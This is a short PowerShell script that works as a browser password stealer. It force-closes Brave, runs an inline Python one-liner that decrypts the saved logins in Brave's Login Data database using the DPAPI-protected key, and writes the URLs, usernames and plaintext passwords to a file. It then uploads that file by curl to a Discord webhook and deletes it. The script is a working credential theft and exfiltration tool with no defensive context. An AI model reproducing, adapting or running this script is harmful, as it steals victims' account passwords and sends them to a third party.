# Tuer Brave VRAIMENT
Get-Process | Where-Object {$_.ProcessName -like "*brave*"} | Stop-Process -Force
Start-Sleep -Seconds 5

cd $env:TEMP\py

.\python.exe -c "import os,json,base64,sqlite3,shutil,win32crypt,time;from Crypto.Cipher import AES;bp=os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data');ls=os.path.join(bp,'Local State');ld=os.path.join(bp,'Default','Login Data');f=open(ls,'r',encoding='utf-8');d=json.load(f);f.close();ek=base64.b64decode(d['os_crypt']['encrypted_key'])[5:];k=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1];success=False;[exec('try:\n if os.path.exists(\"t.db\"):os.remove(\"t.db\")\n shutil.copy2(ld,\"t.db\")\n time.sleep(1)\n c=sqlite3.connect(\"t.db\",timeout=60)\n r=c.cursor()\n r.execute(\"SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=\\\"\\\" LIMIT 3\")\n for u,n,p in r.fetchall():\n  pwd=AES.new(k,AES.MODE_GCM,nonce=p[3:15]).decrypt_and_verify(p[15:-16],p[-16:]).decode()\n  print(f\"\\n{u}\\nUser:{n}\\nPass:{pwd}\")\n c.close()\n os.remove(\"t.db\")\n success=True\nexcept Exception as e:\n if i<9:time.sleep(2)\n else:print(f\"Failed after 10 tries: {e}\")') for i in range(10) if not success]" > result.txt 2>&1

curl.exe -F "file=@result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

Remove-Item result.txt -Force
